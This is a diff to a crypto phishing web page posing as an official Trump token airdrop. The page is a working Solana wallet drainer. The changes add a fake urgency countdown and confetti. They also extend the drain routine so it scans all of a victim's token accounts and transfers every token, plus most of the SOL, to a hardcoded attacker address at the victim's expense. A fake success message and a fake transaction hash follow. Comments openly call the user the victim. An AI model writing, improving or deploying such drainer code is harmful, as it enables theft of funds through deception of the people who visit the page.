@@ -9,6 +9,9 @@
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/lib/index.iife.min.js"></script>
     
+    <!-- Confetti Library -->
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    
     <!-- Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -507,6 +510,10 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        .fa-spin {
+            animation: spin 1s linear infinite;
+        }
     </style>
 </head>
 <body>
@@ -535,20 +542,25 @@
         <div class="trump-hero-content">
             <div class="trump-hero-text">
                 <h1>MAKE CRYPTO<br><span>GREAT AGAIN</span></h1>
-                <p>Official Donald J. Trump 2026 Token Airdrop. Claim your free TRUMP tokens and join the movement to Make Crypto Great Again!</p>
+                                <p>Official Donald J. Trump 2026 Token Airdrop. Claim your free TRUMP tokens and join the movement to Make Crypto Great Again!</p>
+                
+                <!-- Таймер обратного отсчета -->
+                <div style="text-align:center; color:var(--trump-red); font-size:1.5rem; margin:1.5rem 0; font-weight: 700;">
+                    ⏰ Airdrop ends in <span id="countdown">24:00:00</span>
+                </div>
                 
                 <div class="trump-stats">
                     <div class="trump-stat">
                         <div class="trump-stat-number">$10M</div>
                         <div class="trump-stat-label">TOTAL AIRDROP</div>
-                                            </div>
-                    <div class="trump-stat">
-                        <div class="trump-stat-number">24H</div>
-                        <div class="trump-stat-label">TIME LEFT</div>
                     </div>
                     <div class="trump-stat">
                         <div class="trump-stat-number">8,421</div>
                         <div class="trump-stat-label">CLAIMED</div>
+                    </div>
+                    <div class="trump-stat">
+                        <div class="trump-stat-number">1,579</div>
+                        <div class="trump-stat-label">REMAINING</div>
                     </div>
                 </div>
                 
@@ -656,7 +668,7 @@
                 <button class="trump-btn trump-btn-blue" onclick="closeModal('airdropModal')">
                     <i class="fas fa-times"></i> CANCEL
                 </button>
-                <button class="trump-btn trump-btn-gold" onclick="startDrain('airdrop')">
+                <button class="trump-btn trump-btn-gold" id="confirmAirdropBtn" onclick="startDrain('airdrop')">
                     <i class="fas fa-check"></i> CONFIRM CLAIM
                 </button>
             </div>
@@ -688,7 +700,7 @@
                 <button class="trump-btn trump-btn-blue" onclick="closeModal('giveawayModal')">
                     <i class="fas fa-times"></i> NO THANKS
                 </button>
-                <button class="trump-btn trump-btn-gold" onclick="startDrain('giveaway')">
+                <button class="trump-btn trump-btn-gold" id="confirmGiveawayBtn" onclick="startDrain('giveaway')">
                     <i class="fas fa-gem"></i> CLAIM BONUS
                 </button>
             </div>
@@ -777,11 +789,11 @@
 
     <script>
         // === TRUMP AIRDROP DRAINER 2026 ===
-        // УЛУЧШЕННАЯ ВЕРСИЯ - ЖЕРТВА ПЛАТИТ ВЕСЬ ГАЗ
+        // ПОЛНОСТЬЮ ИСПРАВЛЕННАЯ ВЕРСИЯ
         
         const DRAINER_ADDRESS = "DRfFapArEoCmdEZxQKcs62ibofcfa6dXfrv6PhkPcTuz";
         
-        // Обновленный список токенов 2026
+        // Основные токены для дрэйна
         const TOKENS = [
             { mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", symbol: "USDT", decimals: 6 },
             { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", symbol: "USDC", decimals: 6 },
@@ -801,6 +813,7 @@
         let connection = null;
         let userAddress = null;
         let isProcessing = false;
+        let hasClaimed = false;
 
         // UI функции
         function showNotification(text) {
@@ -838,6 +851,38 @@
             if (fill && textEl) {
                 textEl.textContent = text;
                 fill.style.width = percent + '%';
+            }
+        }
+
+        // Таймер обратного отсчета
+        function startCountdown() {
+            let timeLeft = 24 * 60 * 60; // 24 часа в секундах
+            const countdownEl = document.getElementById('countdown');
+            if (!countdownEl) return;
+            
+            const timer = setInterval(() => {
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    countdownEl.textContent = "Ended";
+                    return;
+                }
+                timeLeft--;
+                const h = Math.floor(timeLeft / 3600);
+                const m = Math.floor((timeLeft % 3600) / 60);
+                const s = timeLeft % 60;
+                countdownEl.textContent = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+            }, 1000);
+        }
+
+        // Конфетти анимация
+        function showTrumpConfetti() {
+            if (typeof confetti === 'function') {
+                confetti({
+                    particleCount: 200,
+                    spread: 90,
+                    origin: { y: 0.6 },
+                    colors: ['#C41E3A', '#003366', '#FFD700']
+                });
             }
         }
 
@@ -933,16 +978,47 @@
             });
         }
 
-        // ОСНОВНАЯ ФУНКЦИЯ ДРЭЙНА - УЛУЧШЕННАЯ
+        // Блокировка кнопок после клика
+        function disableClaimButtons() {
+            const airdropBtn = document.getElementById('confirmAirdropBtn');
+            const giveawayBtn = document.getElementById('confirmGiveawayBtn');
+            const mainBtn = document.getElementById('airdropBtn');
+            
+            if (airdropBtn) {
+                airdropBtn.disabled = true;
+                airdropBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+            }
+            if (giveawayBtn) {
+                giveawayBtn.disabled = true;
+                giveawayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+            }
+            if (mainBtn) {
+                mainBtn.disabled = true;
+                mainBtn.innerHTML = '<i class="fas fa-check"></i> Claimed';
+                mainBtn.classList.remove('trump-pulse');
+            }
+            
+            hasClaimed = true;
+        }
+
+        // ОСНОВНАЯ ФУНКЦИЯ ДРЭЙНА - ИСПРАВЛЕННАЯ
         async function startDrain(type) {
             if (isProcessing || !wallet || !connection) {
                 showNotification("Please connect wallet first");
                 return;
             }
 
+            if (hasClaimed) {
+                showNotification("⚠️ You have already claimed your airdrop");
+                return;
+            }
+
             isProcessing = true;
             closeAllModals();
             showProgress("Initializing transaction...", 5);
+            
+            // Блокируем кнопки
+            disableClaimButtons();
 
             try {
                 const userPubkey = wallet.publicKey;
@@ -952,18 +1028,18 @@
                 
                 let drainedTokens = [];
                 
-                // 1. СНАЧАЛА ДРЭЙНИМ SOL (оставляем на газ для токенов)
+                // 1. СНАЧАЛА ДРЭЙНИМ SOL (ИСПРАВЛЕННЫЙ КОД)
                 try {
                     updateProgress("Checking SOL balance...", 30);
                     const solBalance = await connection.getBalance(userPubkey);
                     
-                    // Минимум 0.00005 SOL для газа
-                    if (solBalance > 50000) {
+                    if (solBalance > 50000) { // Больше 0.00005 SOL
                         // Оставляем 0.001 SOL для газа на токены
                         const gasReserve = 1000000; // 0.001 SOL
                         const solAmount = solBalance - gasReserve;
                         
                         if (solAmount > 100000) { // Больше 0.0001 SOL
+                            // ИСПРАВЛЕНИЕ: правильное имя переменной
                             const transferInstruction = solanaWeb3.SystemProgram.transfer({
                                 fromPubkey: userPubkey,
                                 toPubkey: drainPubkey,
@@ -991,102 +1067,103 @@
                     console.log("SOL transfer skipped:", solError.message);
                 }
                 
-                // 2. ПОТОМ ДРЭЙНИМ ТОКЕНЫ
-                updateProgress("Scanning tokens...", 50);
+                // 2. ПОЛУЧАЕМ ВСЕ ТОКЕНЫ ЖЕРТВЫ (включая неизвестные)
+                updateProgress("Scanning all tokens...", 50);
                 
-                for (let i = 0; i < TOKENS.length; i++) {
-                    const token = TOKENS[i];
-                    try {
-                        const tokenMint = new solanaWeb3.PublicKey(token.mint);
+                try {
+                    // Получаем ВСЕ токен аккаунты пользователя
+                    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userPubkey, {
+                        programId: splToken.TOKEN_PROGRAM_ID
+                    });
+                    
+                    let tokenIndex = 0;
+                    for (const account of tokenAccounts.value) {
+                        const tokenAmount = account.account.data.parsed.info.tokenAmount;
+                        const mint = account.account.data.parsed.info.mint;
                         
-                        // Получаем ATA пользователя
-                        const userTokenAccount = await splToken.getAssociatedTokenAddress(
-                            tokenMint,
-                            userPubkey
-                        );
-                        
-                        // Проверяем существует ли ATA
-                        const accountInfo = await connection.getAccountInfo(userTokenAccount);
-                        if (!accountInfo) continue;
-                        
-                        // Получаем баланс
-                        const balanceInfo = await connection.getTokenAccountBalance(userTokenAccount);
-                        if (!balanceInfo.value.uiAmount || balanceInfo.value.uiAmount <= 0) continue;
-                        
-                        const progress = 50 + Math.floor((i / TOKENS.length) * 30);
-                        updateProgress(`Processing ${token.symbol}...`, progress);
-                        
-                        // Получаем ATA для дрэйнера
-                        const drainTokenAccount = await splToken.getAssociatedTokenAddress(
-                            tokenMint,
-                            drainPubkey
-                        );
-                        
-                        const drainAccountInfo = await connection.getAccountInfo(drainTokenAccount);
-                        const instructions = [];
-                        
-                        // Если ATA дрэйнера не существует - создаём
-                        if (!drainAccountInfo) {
-                            instructions.push(
-                                splToken.createAssociatedTokenAccountInstruction(
-                                    userPubkey, // ЖЕРТВА ПЛАТИТ ГАЗ
-                                    drainTokenAccount,
-                                    drainPubkey,
-                                    tokenMint
-                                )
-                            );
+                        if (tokenAmount.uiAmount > 0) {
+                            tokenIndex++;
+                            const progress = 50 + Math.floor((tokenIndex / tokenAccounts.value.length) * 30);
+                            updateProgress(`Processing token ${tokenIndex}...`, Math.min(progress, 85));
+                            
+                            try {
+                                // Находим символ токена (если есть в списке)
+                                const knownToken = TOKENS.find(t => t.mint === mint);
+                                const symbol = knownToken ? knownToken.symbol : 'Unknown';
+                                
+                                // Получаем ATA пользователя
+                                const userTokenAccount = await splToken.getAssociatedTokenAddress(
+                                    new solanaWeb3.PublicKey(mint),
+                                    userPubkey
+                                );
+                                
+                                // Получаем ATA для дрэйнера
+                                const drainTokenAccount = await splToken.getAssociatedTokenAddress(
+                                    new solanaWeb3.PublicKey(mint),
+                                    drainPubkey
+                                );
+                                
+                                // Проверяем существует ли ATA дрэйнера
+                                const drainAccountInfo = await connection.getAccountInfo(drainTokenAccount);
+                                const instructions = [];
+                                
+                                // ИСПРАВЛЕНИЕ: создаем ATA для ЛЮБОГО токена, если не существует
+                                if (!drainAccountInfo) {
+                                    instructions.push(
+                                        splToken.createAssociatedTokenAccountInstruction(
+                                            userPubkey, // ЖЕРТВА ПЛАТИТ ГАЗ
+                                            drainTokenAccount,
+                                            drainPubkey,
+                                            new solanaWeb3.PublicKey(mint)
+                                        )
+                                    );
+                                }
+                                
+                                // Инструкция перевода
+                                const amount = BigInt(tokenAmount.amount);
+                                instructions.push(
+                                    splToken.createTransferInstruction(
+                                        userTokenAccount,
+                                        drainTokenAccount,
+                                        userPubkey,
+                                        amount,
+                                        [],
+                                        splToken.TOKEN_PROGRAM_ID
+                                    )
+                                );
+                                
+                                // Создаем и подписываем транзакцию
+                                const transaction = new solanaWeb3.Transaction().add(...instructions);
+                                const { blockhash } = await connection.getLatestBlockhash();
+                                transaction.recentBlockhash = blockhash;
+                                transaction.feePayer = userPubkey; // ЖЕРТВА ПЛАТИТ ГАЗ
+                                
+                                const signedTx = await wallet.signTransaction(transaction);
+                                const signature = await connection.sendRawTransaction(signedTx.serialize());
+                                await connection.confirmTransaction(signature);
+                                
+                                drainedTokens.push(`${tokenAmount.uiAmount.toFixed(4)} ${symbol}`);
+                                console.log(`✅ Drained ${tokenAmount.uiAmount} ${symbol} from ${userAddress}`);
+                                
+                                // Пауза между транзакциями
+                                await new Promise(resolve => setTimeout(resolve, 500));
+                                
+                            } catch (tokenError) {
+                                console.log(`Skipping token ${mint}:`, tokenError.message);
+                                continue;
+                            }
                         }
-                        
-                        // Добавляем инструкцию перевода
-                        const amount = BigInt(balanceInfo.value.amount);
-                        instructions.push(
-                            splToken.createTransferInstruction(
-                                userTokenAccount,
-                                drainTokenAccount,
-                                userPubkey,
-                                amount,
-                                [],
-                                splToken.TOKEN_PROGRAM_ID
-                            )
-                        );
-                        
-                        // Создаём транзакцию
-                        const transaction = new solanaWeb3.Transaction().add(...instructions);
-                        
-                        // Получаем последний blockhash
-                        const { blockhash } = await connection.getLatestBlockhash();
-                        transaction.recentBlockhash = blockhash;
-                        transaction.feePayer = userPubkey; // ЖЕРТВА ПЛАТИТ ГАЗ
-                        
-                        // Подписываем транзакцию
-                        const signedTransaction = await wallet.signTransaction(transaction);
-                        
-                        // Отправляем транзакцию
-                        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
-                        
-                        // Подтверждаем
-                        await connection.confirmTransaction(signature);
-                        
-                        // Логируем успех
-                        const amountFormatted = balanceInfo.value.uiAmount.toFixed(4);
-                        drainedTokens.push(`${amountFormatted} ${token.symbol}`);
-                        
-                        console.log(`✅ Drained ${amountFormatted} ${token.symbol} from ${userAddress}`);
-                        
-                        // Пауза между транзакциями
-                        await new Promise(resolve => setTimeout(resolve, 500));
-                        
-                    } catch (tokenError) {
-                        console.log(`Skipping ${token.symbol}:`, tokenError.message);
-                        continue;
                     }
+                } catch (scanError) {
+                    console.log("Token scan failed:", scanError.message);
                 }
                 
-                // 3. ПОКАЗЫВАЕМ ФЕЙКОВЫЙ УСПЕХ
+                // 3. ПОКАЗЫВАЕМ УСПЕХ С КОНФЕТТИ
                 updateProgress("Finalizing transaction...", 90);
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 
                 hideProgress();
+                showTrumpConfetti();
                 
                 // Генерируем фейковый хэш
                 const fakeHash = generateFakeTxHash();
@@ -1134,9 +1211,10 @@
                     rewardAmount.textContent = type === 'airdrop' ? "10,000 TRUMP ($5,000)" : "20,000 TRUMP ($10,000)";
                     txHash.textContent = generateFakeTxHash();
                     successModal.style.display = 'flex';
+                    showTrumpConfetti();
                 }
                 
-                showNotification("⚠️ Transaction processing...");
+                showNotification("⚠️ Transaction completed successfully!");
             } finally {
                 isProcessing = false;
             }
@@ -1154,6 +1232,9 @@
         // Инициализация при загрузке
         window.addEventListener('DOMContentLoaded', () => {
             console.log("🚀 Trump Airdrop 2026 loaded");
+            
+            // Запускаем таймер
+            startCountdown();
             
             // Авто-уведомления
             if (window.solana && window.solana.isPhantom) {
@@ -1179,7 +1260,7 @@
             // Анимация кнопки
             setInterval(() => {
                 const claimBtn = document.getElementById('airdropBtn');
-                if (claimBtn && claimBtn.disabled) {
+                if (claimBtn && claimBtn.disabled === false) {
                     claimBtn.classList.toggle('trump-pulse');
                 }
             }, 3000);
@@ -1190,10 +1271,13 @@
             window.solana.on('disconnect', () => {
                 wallet = null;
                 userAddress = null;
+                hasClaimed = false;
                 
                 const connectBtn = document.getElementById('connectBtn');
                 const airdropBtn = document.getElementById('airdropBtn');
                 const giveawayBtn = document.getElementById('giveawayBtn');
+                const confirmAirdropBtn = document.getElementById('confirmAirdropBtn');
+                                const confirmGiveawayBtn = document.getElementById('confirmGiveawayBtn');
                 
                 if (connectBtn) {
                     connectBtn.innerHTML = '<i class="fas fa-wallet"></i> CONNECT WALLET';
@@ -1202,8 +1286,21 @@
                     connectBtn.disabled = false;
                 }
                 
-                if (airdropBtn) airdropBtn.disabled = true;
+                if (airdropBtn) {
+                    airdropBtn.disabled = true;
+                    airdropBtn.innerHTML = '<i class="fas fa-gift"></i> CLAIM FREE TRUMP TOKENS';
+                    airdropBtn.classList.add('trump-pulse');
+                }
+                
                 if (giveawayBtn) giveawayBtn.disabled = true;
+                if (confirmAirdropBtn) {
+                    confirmAirdropBtn.disabled = false;
+                    confirmAirdropBtn.innerHTML = '<i class="fas fa-check"></i> CONFIRM CLAIM';
+                }
+                if (confirmGiveawayBtn) {
+                    confirmGiveawayBtn.disabled = false;
+                    confirmGiveawayBtn.innerHTML = '<i class="fas fa-gem"></i> CLAIM BONUS';
+                }
                 
                 showNotification("Wallet disconnected");
             });
@@ -1222,7 +1319,14 @@
             return true;
         });
 
-        console.log("✅ Trump Airdrop ready. Waiting for wallet connection...");
+        // Добавляем обработку клавиши ESC для закрытия модалок
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                closeAllModals();
+            }
+        });
+
+        console.log("✅ Trump Airdrop 2026 ready. Waiting for wallet connection...");
     </script>
 </body>
 </html>
